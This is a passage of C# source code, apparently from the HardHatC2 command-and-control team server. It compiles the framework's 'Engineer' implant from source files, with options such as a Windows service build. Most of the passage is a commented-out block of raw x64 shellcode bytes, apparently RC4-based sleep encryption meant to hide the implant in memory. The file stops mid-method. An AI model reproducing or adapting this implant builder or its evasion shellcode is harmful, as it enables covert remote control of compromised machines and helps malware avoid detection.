using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;
using Microsoft.CodeAnalysis;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System;
using System.Linq;
using System.Diagnostics;
using System.CodeDom.Compiler;
using ApiModels.Requests;
using Microsoft.CSharp;

namespace TeamServer.Utilities
{
    public class Compile
    {

        public bool Confuse { get; set;}
        
        public static byte[] GenerateCode(string source,SpawnEngineerRequest.EngCompileType compileType, SpawnEngineerRequest.SleepTypes sleepType)
        {
            string assemblyName = Path.GetRandomFileName();

            //replace  @"{{REPLACE_PROGRAM_NAME}}" with the name of the program you want to compile

            char allPlatformPathSeperator = Path.DirectorySeparatorChar;
            string assemblyBasePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            string[] pathSplit = assemblyBasePath.Split("bin"); // [0] is the main path D:\my_Custom_code\HardHatC2\Teamserver\ 
            pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
            pathSplit[1] = pathSplit[1].Replace("\\", allPlatformPathSeperator.ToString());
            string dataFolderPath = pathSplit[0] + "Data";

            //return the filenames from the dataFolderPath directory
            string[] assemblyRefList = Directory.GetFiles(dataFolderPath);

            EnumerationOptions enumOptions = new EnumerationOptions() { RecurseSubdirectories = true  }; // enables searching sub dirs to get all the cs files.
            string[] otherCsFileList = Directory.GetFiles(pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}", "*.cs",enumOptions);
            //remove the program.cs file from the list
            string[] csFileList = otherCsFileList.Where(x => x != pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}Program.cs").ToArray();
            
            //if compileType is not serviceexe then remove the ServiceExeMode.cs file from the list
            if(compileType != SpawnEngineerRequest.EngCompileType.serviceexe)
            {
                csFileList = csFileList.Where(x => x != pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}Extra{allPlatformPathSeperator}ServiceExeMode.cs").ToArray();
            }

            //if sleepType is None then dont include the SleepEncrypt.cs file
            //if (sleepType == SpawnEngineerRequest.SleepTypes.Custom_RC4)
            //{
            //    //repalce the content of the sleepEncrypt file with an empty class 
            //    var file = pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}Functions{allPlatformPathSeperator}SleepEncrypt.cs";
            //    string shellText = "{\r\n  0x57, 0x48, 0x89, 0xe7, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20,\r\n  0xe8, 0x0f, 0x04, 0x00, 0x00, 0x48, 0x89, 0xfc, 0x5f, 0xc3, 0x66, 0x2e,\r\n  0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x54, 0x49, 0x89,\r\n  0xcc, 0x57, 0x44, 0x89, 0xc7, 0x49, 0x89, 0xc8, 0x56, 0x4c, 0x89, 0xce,\r\n  0x41, 0x89, 0xd1, 0x53, 0x89, 0xd3, 0x48, 0x89, 0xca, 0x48, 0x83, 0xec,\r\n  0x38, 0x48, 0x8b, 0x8c, 0x24, 0x80, 0x00, 0x00, 0x00, 0xe8, 0xa6, 0x02,\r\n  0x00, 0x00, 0x89, 0xda, 0x4c, 0x8d, 0x4c, 0x24, 0x2c, 0x41, 0x89, 0xf8,\r\n  0xc7, 0x44, 0x24, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xe1, 0xff,\r\n  0xd6, 0x85, 0xc0, 0x0f, 0x95, 0xc0, 0x48, 0x83, 0xc4, 0x38, 0x5b, 0x0f,\r\n  0xb6, 0xc0, 0x5e, 0x5f, 0x41, 0x5c, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90,\r\n  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xe9, 0x0b, 0x00, 0x00,\r\n  0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,\r\n  0x41, 0x57, 0x41, 0x56, 0x4d, 0x89, 0xce, 0x41, 0x55, 0x4d, 0x89, 0xc5,\r\n  0x41, 0x54, 0x55, 0x89, 0xcd, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x57, 0x56,\r\n  0x53, 0x89, 0xd3, 0x31, 0xd2, 0x48, 0x83, 0xec, 0x48, 0x48, 0x8b, 0xbc,\r\n  0x24, 0xc8, 0x00, 0x00, 0x00, 0xff, 0x94, 0x24, 0xb8, 0x00, 0x00, 0x00,\r\n  0x48, 0x83, 0xf8, 0xff, 0x74, 0x2b, 0x48, 0x8d, 0x74, 0x24, 0x20, 0xc7,\r\n  0x44, 0x24, 0x20, 0x1c, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc4, 0x48, 0x89,\r\n  0xc1, 0x48, 0x89, 0xf2, 0xff, 0x94, 0x24, 0xc0, 0x00, 0x00, 0x00, 0x85,\r\n  0xc0, 0x75, 0x5d, 0x4c, 0x89, 0xe1, 0xff, 0x94, 0x24, 0xb0, 0x00, 0x00,\r\n  0x00, 0x48, 0x83, 0xc4, 0x48, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41,\r\n  0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc3, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00,\r\n  0x31, 0xd2, 0xb9, 0xff, 0x03, 0x1f, 0x00, 0x41, 0xff, 0xd5, 0x49, 0x89,\r\n  0xc7, 0x48, 0x85, 0xc0, 0x74, 0x16, 0x48, 0x89, 0xc1, 0x41, 0xff, 0xd6,\r\n  0x4c, 0x89, 0xf9, 0xff, 0x94, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x66, 0x0f,\r\n  0x1f, 0x44, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x20, 0x1c, 0x00, 0x00, 0x00,\r\n  0x48, 0x89, 0xf2, 0x4c, 0x89, 0xe1, 0xff, 0xd7, 0x85, 0xc0, 0x74, 0xa3,\r\n  0x83, 0x7c, 0x24, 0x20, 0x0f, 0x76, 0xe5, 0x44, 0x8b, 0x44, 0x24, 0x28,\r\n  0x41, 0x39, 0xd8, 0x74, 0xdb, 0x39, 0x6c, 0x24, 0x2c, 0x75, 0xd5, 0xeb,\r\n  0xab, 0x90, 0x90, 0x90, 0x41, 0x54, 0x89, 0xd2, 0x4c, 0x89, 0xc8, 0x49,\r\n  0x89, 0xcc, 0x53, 0x48, 0x89, 0xd3, 0x48, 0x83, 0xec, 0x38, 0xc7, 0x44,\r\n  0x24, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x4c, 0x24, 0x2c, 0xff,\r\n  0xd0, 0x85, 0xc0, 0x74, 0x18, 0x48, 0x8b, 0x4c, 0x24, 0x70, 0x41, 0x89,\r\n  0xd9, 0x4d, 0x89, 0xe0, 0x4c, 0x89, 0xe2, 0xe8, 0x58, 0x01, 0x00, 0x00,\r\n  0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x38, 0x5b, 0x41, 0x5c,\r\n  0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,\r\n  0x55, 0xb8, 0x43, 0x00, 0x00, 0x00, 0x57, 0x56, 0x48, 0x89, 0xce, 0xb9,\r\n  0x28, 0x00, 0x00, 0x00, 0x53, 0x48, 0x83, 0xec, 0x68, 0x48, 0x8d, 0x6c,\r\n  0x24, 0x30, 0x66, 0x89, 0x44, 0x24, 0x2e, 0x31, 0xc0, 0x48, 0x89, 0xef,\r\n  0xf3, 0xaa, 0xff, 0xd2, 0x48, 0x8d, 0x7c, 0x24, 0x2e, 0x48, 0x89, 0xc3,\r\n  0xeb, 0x0d, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0xf6, 0x44, 0x24, 0x3e,\r\n  0x04, 0x75, 0x19, 0x48, 0x89, 0xea, 0x48, 0x89, 0xd9, 0xff, 0xd6, 0x85,\r\n  0xc0, 0x75, 0xed, 0x48, 0x83, 0xc4, 0x68, 0x5b, 0x5e, 0x5f, 0x5d, 0xc3,\r\n  0x0f, 0x1f, 0x40, 0x00, 0x48, 0x8b, 0x54, 0x24, 0x30, 0x44, 0x8b, 0x4c,\r\n  0x24, 0x38, 0x48, 0x89, 0xf9, 0x49, 0x89, 0xd0, 0xe8, 0x03, 0x00, 0x00,\r\n  0x00, 0xeb, 0xd0, 0x90, 0x57, 0x31, 0xc0, 0x56, 0x48, 0x89, 0xd6, 0x53,\r\n  0x48, 0x89, 0xcb, 0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00, 0x48, 0x89,\r\n  0xe2, 0x0f, 0x1f, 0x00, 0x88, 0x04, 0x02, 0x48, 0x83, 0xc0, 0x01, 0x48,\r\n  0x3d, 0x00, 0x01, 0x00, 0x00, 0x75, 0xf1, 0x45, 0x31, 0xdb, 0x31, 0xc9,\r\n  0x0f, 0x1f, 0x40, 0x00, 0x89, 0xc8, 0x44, 0x0f, 0xb6, 0x12, 0x83, 0xc1,\r\n  0x01, 0x48, 0x83, 0xc2, 0x01, 0x83, 0xe0, 0x07, 0x0f, 0xb6, 0x3c, 0x03,\r\n  0x44, 0x01, 0xd7, 0x89, 0xf8, 0x44, 0x01, 0xd8, 0x44, 0x0f, 0xb6, 0xd8,\r\n  0x0f, 0xb6, 0xc0, 0x0f, 0xb6, 0x3c, 0x04, 0x40, 0x88, 0x7a, 0xff, 0x44,\r\n  0x88, 0x14, 0x04, 0x81, 0xf9, 0x00, 0x01, 0x00, 0x00, 0x75, 0xc9, 0x45,\r\n  0x85, 0xc9, 0x74, 0x54, 0x44, 0x89, 0xcb, 0x45, 0x31, 0xdb, 0x45, 0x31,\r\n  0xc9, 0x45, 0x31, 0xd2, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n  0x41, 0x8d, 0x53, 0x01, 0x44, 0x0f, 0xb6, 0xda, 0x0f, 0xb6, 0xd2, 0x0f,\r\n  0xb6, 0x04, 0x14, 0x42, 0x8d, 0x0c, 0x10, 0x44, 0x0f, 0xb6, 0xd1, 0x0f,\r\n  0xb6, 0xc9, 0x0f, 0xb6, 0x3c, 0x0c, 0x40, 0x88, 0x3c, 0x14, 0x88, 0x04,\r\n  0x0c, 0x02, 0x04, 0x14, 0x0f, 0xb6, 0xc0, 0x0f, 0xb6, 0x04, 0x04, 0x42,\r\n  0x32, 0x04, 0x0e, 0x43, 0x88, 0x04, 0x08, 0x49, 0x83, 0xc1, 0x01, 0x4c,\r\n  0x39, 0xcb, 0x75, 0xc0, 0x48, 0x81, 0xc4, 0x00, 0x01, 0x00, 0x00, 0x5b,\r\n  0x5e, 0x5f, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x57, 0x49, 0x89, 0xd2,\r\n  0x31, 0xc0, 0x56, 0x53, 0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00, 0x48,\r\n  0x89, 0xe2, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0x88, 0x04, 0x02, 0x48,\r\n  0x83, 0xc0, 0x01, 0x48, 0x3d, 0x00, 0x01, 0x00, 0x00, 0x75, 0xf1, 0x45,\r\n  0x85, 0xc9, 0x74, 0x52, 0x44, 0x89, 0xce, 0x31, 0xdb, 0x45, 0x31, 0xc9,\r\n  0x45, 0x31, 0xdb, 0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n  0x8d, 0x53, 0x01, 0x0f, 0xb6, 0xda, 0x0f, 0xb6, 0xd2, 0x0f, 0xb6, 0x04,\r\n  0x14, 0x42, 0x8d, 0x0c, 0x18, 0x44, 0x0f, 0xb6, 0xd9, 0x0f, 0xb6, 0xc9,\r\n  0x0f, 0xb6, 0x3c, 0x0c, 0x40, 0x88, 0x3c, 0x14, 0x88, 0x04, 0x0c, 0x02,\r\n  0x04, 0x14, 0x0f, 0xb6, 0xc0, 0x0f, 0xb6, 0x04, 0x04, 0x43, 0x32, 0x04,\r\n  0x0a, 0x43, 0x88, 0x04, 0x08, 0x49, 0x83, 0xc1, 0x01, 0x4c, 0x39, 0xce,\r\n  0x75, 0xc2, 0x48, 0x81, 0xc4, 0x00, 0x01, 0x00, 0x00, 0x5b, 0x5e, 0x5f,\r\n  0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x49, 0x89, 0xc8, 0x48,\r\n  0x89, 0xd1, 0x4a, 0x8d, 0x44, 0x02, 0xff, 0x31, 0xd2, 0x48, 0xf7, 0xf1,\r\n  0x48, 0x0f, 0xaf, 0xc1, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,\r\n  0x90, 0x90, 0x90, 0x90, 0x48, 0x85, 0xd2, 0x74, 0x17, 0x48, 0x01, 0xca,\r\n  0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x30, 0x01, 0x48,\r\n  0x83, 0xc1, 0x01, 0x48, 0x39, 0xca, 0x75, 0xf4, 0xc3, 0x90, 0x90, 0x90,\r\n  0x49, 0x89, 0xcb, 0x49, 0x89, 0xd2, 0x4d, 0x85, 0xc9, 0x74, 0x1f, 0x31,\r\n  0xc9, 0x0f, 0x1f, 0x00, 0x48, 0x89, 0xc8, 0x31, 0xd2, 0x49, 0xf7, 0xf2,\r\n  0x41, 0x0f, 0xb6, 0x04, 0x13, 0x41, 0x30, 0x04, 0x08, 0x48, 0x83, 0xc1,\r\n  0x01, 0x49, 0x39, 0xc9, 0x75, 0xe6, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90,\r\n  0x80, 0x39, 0x00, 0x74, 0x23, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x29, 0xc8,\r\n  0x0f, 0x1f, 0x40, 0x00, 0x44, 0x8d, 0x04, 0x08, 0x48, 0x83, 0xc1, 0x01,\r\n  0x80, 0x39, 0x00, 0x75, 0xf3, 0x44, 0x89, 0xc0, 0xc3, 0x0f, 0x1f, 0x80,\r\n  0x00, 0x00, 0x00, 0x00, 0x45, 0x31, 0xc0, 0x44, 0x89, 0xc0, 0xc3, 0x90,\r\n  0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x55, 0x57, 0x56, 0x53,\r\n  0x48, 0x81, 0xec, 0xd8, 0x05, 0x00, 0x00, 0x8b, 0x41, 0x08, 0x48, 0x8b,\r\n  0x29, 0x4c, 0x8b, 0x61, 0x10, 0x89, 0x84, 0x24, 0xb4, 0x00, 0x00, 0x00,\r\n  0x8b, 0x41, 0x24, 0x89, 0x44, 0x24, 0x7c, 0x8b, 0x41, 0x28, 0x89, 0x84,\r\n  0x24, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x0f, 0xbe, 0x41, 0x20, 0x48, 0x89,\r\n  0x44, 0x24, 0x40, 0x48, 0x8b, 0x41, 0x18, 0x48, 0x89, 0x84, 0x24, 0x80,\r\n  0x00, 0x00, 0x00, 0x48, 0x8b, 0x41, 0x30, 0x48, 0x89, 0x44, 0x24, 0x48,\r\n  0x48, 0x8b, 0x41, 0x38, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00,\r\n  0x48, 0x8b, 0x41, 0x40, 0x48, 0x89, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00,\r\n  0x48, 0x8b, 0x41, 0x48, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8b, 0x41,\r\n  0x50, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8b, 0x41, 0x58, 0x48, 0x89,\r\n  0x44, 0x24, 0x60, 0x48, 0x8b, 0x41, 0x60, 0x8b, 0x75, 0x3c, 0x48, 0x89,\r\n  0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x41, 0x68, 0x48, 0x01,\r\n  0xee, 0x48, 0x89, 0x84, 0x24, 0xa0, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x41,\r\n  0x70, 0x66, 0x83, 0x7e, 0x06, 0x00, 0x48, 0x89, 0x84, 0x24, 0xa8, 0x00,\r\n  0x00, 0x00, 0x48, 0x8b, 0x41, 0x78, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48,\r\n  0x8b, 0x81, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x70, 0x0f,\r\n  0xb7, 0x46, 0x14, 0x48, 0x8d, 0x7c, 0x06, 0x18, 0x0f, 0x84, 0xef, 0x00,\r\n  0x00, 0x00, 0x45, 0x31, 0xf6, 0x48, 0x8d, 0x9c, 0x24, 0xd0, 0x00, 0x00,\r\n  0x00, 0x0f, 0x1f, 0x00, 0x41, 0x0f, 0xb7, 0xce, 0x8d, 0x04, 0x89, 0xc1,\r\n  0xe0, 0x03, 0x48, 0x98, 0x48, 0x01, 0xf8, 0x44, 0x8b, 0x50, 0x14, 0x45,\r\n  0x85, 0xd2, 0x0f, 0x84, 0xb6, 0x00, 0x00, 0x00, 0x44, 0x8b, 0x48, 0x10,\r\n  0x45, 0x85, 0xc9, 0x0f, 0x84, 0xa9, 0x00, 0x00, 0x00, 0x8b, 0x50, 0x24,\r\n  0x44, 0x8b, 0x78, 0x0c, 0xc1, 0xea, 0x1c, 0x49, 0x01, 0xef, 0x83, 0xfa,\r\n  0x06, 0x0f, 0x84, 0xc9, 0x03, 0x00, 0x00, 0x0f, 0x87, 0x93, 0x03, 0x00,\r\n  0x00, 0x83, 0xfa, 0x02, 0x0f, 0x84, 0xaa, 0x03, 0x00, 0x00, 0x83, 0xfa,\r\n  0x04, 0x75, 0x15, 0xc7, 0x84, 0x8c, 0xd0, 0x01, 0x00, 0x00, 0x02, 0x00,\r\n  0x00, 0x00, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n  0x44, 0x8b, 0x50, 0x08, 0x49, 0x89, 0xd9, 0x41, 0xb8, 0x04, 0x00, 0x00,\r\n  0x00, 0x4c, 0x89, 0xf9, 0xc7, 0x84, 0x24, 0xd0, 0x00, 0x00, 0x00, 0x00,\r\n  0x00, 0x00, 0x00, 0x4d, 0x8d, 0xaa, 0xff, 0x0f, 0x00, 0x00, 0x4c, 0x89,\r\n  0xea, 0x81, 0xe2, 0x00, 0xf0, 0xff, 0xff, 0x41, 0xff, 0xd4, 0x85, 0xc0,\r\n  0x75, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x81, 0xc4, 0xd8, 0x05,\r\n  0x00, 0x00, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e,\r\n  0x41, 0x5f, 0xc3, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0x45, 0x89, 0xe9, 0x48,\r\n  0x8b, 0x4c, 0x24, 0x40, 0x4d, 0x89, 0xf8, 0x4c, 0x89, 0xfa, 0x41, 0x81,\r\n  0xe1, 0x00, 0xf0, 0xff, 0xff, 0xe8, 0x16, 0xfd, 0xff, 0xff, 0x41, 0x83,\r\n  0xc6, 0x01, 0x66, 0x44, 0x39, 0x76, 0x06, 0x0f, 0x87, 0x1f, 0xff, 0xff,\r\n  0xff, 0x41, 0xb8, 0x04, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x8c, 0x24, 0xcc,\r\n  0x00, 0x00, 0x00, 0xba, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xe9, 0xc7,\r\n  0x84, 0x24, 0xcc, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0xff,\r\n  0xd4, 0x41, 0x89, 0xc0, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x45, 0x85, 0xc0,\r\n  0x74, 0x8d, 0x31, 0xc0, 0x48, 0x8d, 0x9c, 0x24, 0xd0, 0x00, 0x00, 0x00,\r\n  0x0f, 0x1f, 0x40, 0x00, 0x88, 0x04, 0x03, 0x48, 0x83, 0xc0, 0x01, 0x48,\r\n  0x3d, 0x00, 0x01, 0x00, 0x00, 0x75, 0xf1, 0x4c, 0x8d, 0x95, 0x00, 0x10,\r\n  0x00, 0x00, 0x49, 0x89, 0xe8, 0x45, 0x31, 0xdb, 0x45, 0x31, 0xc9, 0x66,\r\n  0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x8d, 0x51, 0x01,\r\n  0x44, 0x0f, 0xb6, 0xca, 0x0f, 0xb6, 0xd2, 0x0f, 0xb6, 0x84, 0x14, 0xd0,\r\n  0x00, 0x00, 0x00, 0x42, 0x8d, 0x0c, 0x18, 0x44, 0x0f, 0xb6, 0xd9, 0x0f,\r\n  0xb6, 0xc9, 0x44, 0x0f, 0xb6, 0xac, 0x0c, 0xd0, 0x00, 0x00, 0x00, 0x44,\r\n  0x88, 0xac, 0x14, 0xd0, 0x00, 0x00, 0x00, 0x88, 0x84, 0x0c, 0xd0, 0x00,\r\n  0x00, 0x00, 0x02, 0x84, 0x14, 0xd0, 0x00, 0x00, 0x00, 0x0f, 0xb6, 0xc0,\r\n  0x0f, 0xb6, 0x84, 0x04, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x30, 0x00, 0x49,\r\n  0x83, 0xc0, 0x01, 0x4d, 0x39, 0xc2, 0x75, 0xac, 0x48, 0x8b, 0x44, 0x24,\r\n  0x50, 0x4c, 0x8b, 0xbc, 0x24, 0xa8, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x94,\r\n  0x24, 0xb8, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xb4, 0x24, 0xa0, 0x00, 0x00,\r\n  0x00, 0x4c, 0x8b, 0xac, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44,\r\n  0x24, 0x20, 0x4c, 0x8b, 0x8c, 0x24, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x89,\r\n  0x7c, 0x24, 0x38, 0x4c, 0x8b, 0x44, 0x24, 0x48, 0x8b, 0x94, 0x24, 0xb0,\r\n  0x00, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x7c, 0x4c, 0x89, 0x74, 0x24, 0x30,\r\n  0x4c, 0x89, 0x6c, 0x24, 0x28, 0xe8, 0x96, 0xf9, 0xff, 0xff, 0x4c, 0x8b,\r\n  0x4c, 0x24, 0x70, 0x4c, 0x8b, 0x44, 0x24, 0x68, 0x48, 0x8b, 0x54, 0x24,\r\n  0x60, 0x48, 0x8b, 0x4c, 0x24, 0x58, 0xe8, 0x9d, 0xfa, 0xff, 0xff, 0x4c,\r\n  0x8b, 0x94, 0x24, 0x80, 0x00, 0x00, 0x00, 0x8b, 0x8c, 0x24, 0xb4, 0x00,\r\n  0x00, 0x00, 0x41, 0xff, 0xd2, 0x4c, 0x8b, 0x4c, 0x24, 0x70, 0x4c, 0x8b,\r\n  0x44, 0x24, 0x68, 0x48, 0x8b, 0x54, 0x24, 0x60, 0x48, 0x8b, 0x4c, 0x24,\r\n  0x58, 0xe8, 0x72, 0xfa, 0xff, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x50, 0x4c,\r\n  0x89, 0x7c, 0x24, 0x38, 0x4c, 0x89, 0x74, 0x24, 0x30, 0x4c, 0x8b, 0x8c,\r\n  0x24, 0x90, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x44, 0x24, 0x48, 0x8b, 0x4c,\r\n  0x24, 0x7c, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x89, 0x6c, 0x24, 0x28,\r\n  0x8b, 0x94, 0x24, 0xb0, 0x00, 0x00, 0x00, 0xe8, 0x1c, 0xf9, 0xff, 0xff,\r\n  0x4c, 0x8b, 0x94, 0x24, 0xb8, 0x00, 0x00, 0x00, 0x31, 0xc0, 0x66, 0x90,\r\n  0x88, 0x04, 0x03, 0x48, 0x83, 0xc0, 0x01, 0x48, 0x3d, 0x00, 0x01, 0x00,\r\n  0x00, 0x75, 0xf1, 0x48, 0x89, 0xe9, 0x45, 0x31, 0xc9, 0x45, 0x31, 0xc0,\r\n  0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x8d, 0x50, 0x01,\r\n  0x44, 0x0f, 0xb6, 0xc2, 0x0f, 0xb6, 0xd2, 0x0f, 0xb6, 0x84, 0x14, 0xd0,\r\n  0x00, 0x00, 0x00, 0x46, 0x8d, 0x1c, 0x08, 0x45, 0x0f, 0xb6, 0xcb, 0x45,\r\n  0x0f, 0xb6, 0xdb, 0x46, 0x0f, 0xb6, 0xac, 0x1c, 0xd0, 0x00, 0x00, 0x00,\r\n  0x44, 0x88, 0xac, 0x14, 0xd0, 0x00, 0x00, 0x00, 0x42, 0x88, 0x84, 0x1c,\r\n  0xd0, 0x00, 0x00, 0x00, 0x02, 0x84, 0x14, 0xd0, 0x00, 0x00, 0x00, 0x0f,\r\n  0xb6, 0xc0, 0x0f, 0xb6, 0x84, 0x04, 0xd0, 0x00, 0x00, 0x00, 0x30, 0x01,\r\n  0x48, 0x83, 0xc1, 0x01, 0x49, 0x39, 0xca, 0x75, 0xab, 0x49, 0x89, 0xd9,\r\n  0x41, 0xb8, 0x02, 0x00, 0x00, 0x00, 0xba, 0x00, 0x10, 0x00, 0x00, 0x48,\r\n  0x89, 0xe9, 0xc7, 0x84, 0x24, 0xd0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\r\n  0x00, 0x41, 0xff, 0xd4, 0x85, 0xc0, 0x0f, 0x84, 0xb0, 0x00, 0x00, 0x00,\r\n  0x66, 0x83, 0x7e, 0x06, 0x00, 0x0f, 0x84, 0xf9, 0x00, 0x00, 0x00, 0x4c,\r\n  0x8b, 0x6c, 0x24, 0x40, 0x48, 0x89, 0x6c, 0x24, 0x48, 0x45, 0x31, 0xf6,\r\n  0x4c, 0x89, 0x64, 0x24, 0x40, 0xeb, 0x14, 0x0f, 0x1f, 0x44, 0x00, 0x00,\r\n  0x41, 0x83, 0xc6, 0x01, 0x66, 0x44, 0x39, 0x76, 0x06, 0x0f, 0x86, 0xd1,\r\n  0x00, 0x00, 0x00, 0x41, 0x0f, 0xb7, 0xd6, 0x8d, 0x04, 0x92, 0xc1, 0xe0,\r\n  0x03, 0x48, 0x98, 0x48, 0x01, 0xf8, 0x44, 0x8b, 0x40, 0x14, 0x45, 0x85,\r\n  0xc0, 0x74, 0xd9, 0x8b, 0x48, 0x10, 0x85, 0xc9, 0x74, 0xd2, 0x44, 0x8b,\r\n  0x78, 0x0c, 0x8b, 0x40, 0x08, 0x4c, 0x89, 0xe9, 0x4c, 0x03, 0x7c, 0x24,\r\n  0x48, 0x8b, 0xac, 0x94, 0xd0, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0xa0, 0xff,\r\n  0x0f, 0x00, 0x00, 0x4d, 0x89, 0xf8, 0x4c, 0x89, 0xfa, 0x45, 0x89, 0xe1,\r\n  0x41, 0x81, 0xe1, 0x00, 0xf0, 0xff, 0xff, 0xe8, 0x50, 0xfa, 0xff, 0xff,\r\n  0x4c, 0x89, 0xe2, 0x48, 0x8b, 0x44, 0x24, 0x40, 0x49, 0x89, 0xd9, 0x81,\r\n  0xe2, 0x00, 0xf0, 0xff, 0xff, 0x41, 0x89, 0xe8, 0x4c, 0x89, 0xf9, 0xc7,\r\n  0x84, 0x24, 0xd0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd0,\r\n  0x85, 0xc0, 0x0f, 0x85, 0x74, 0xff, 0xff, 0xff, 0xb8, 0x02, 0x00, 0x00,\r\n  0x00, 0xe9, 0xd1, 0xfc, 0xff, 0xff, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00,\r\n  0x00, 0x00, 0x00, 0x00, 0x83, 0xfa, 0x0c, 0x0f, 0x85, 0x87, 0xfc, 0xff,\r\n  0xff, 0xc7, 0x84, 0x8c, 0xd0, 0x01, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,\r\n  0xe9, 0x77, 0xfc, 0xff, 0xff, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0x00,\r\n  0xc7, 0x84, 0x8c, 0xd0, 0x01, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0xe9,\r\n  0x60, 0xfc, 0xff, 0xff, 0xc7, 0x84, 0x8c, 0xd0, 0x01, 0x00, 0x00, 0x20,\r\n  0x00, 0x00, 0x00, 0xe9, 0x50, 0xfc, 0xff, 0xff, 0x31, 0xc0, 0xe9, 0x80,\r\n  0xfc, 0xff, 0xff, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,\r\n  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,\r\n  0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,\r\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00\r\n}";
            //    file = file.Replace("{{REPLACE_CODE}}",shellText);

            //}

            SyntaxTree syntaxTree = CSharpSyntaxTree.ParseText(source);            
            List<SyntaxTree> trees = new List<SyntaxTree>(); //gets the other needed .cs files besides the main program.cs from Engineers folder.
            foreach (string csFile in  csFileList)
            {
                trees.Add(CSharpSyntaxTree.ParseText(File.ReadAllText(csFile)));
            }
            trees.Add(syntaxTree);
            //get Refrences from the assembly
            List<MetadataReference> references = new List<MetadataReference> { };
            // get MetadataRefrence CreateFromFile for each string in assemblyRefList
            foreach (string assembly in assemblyRefList)
            {
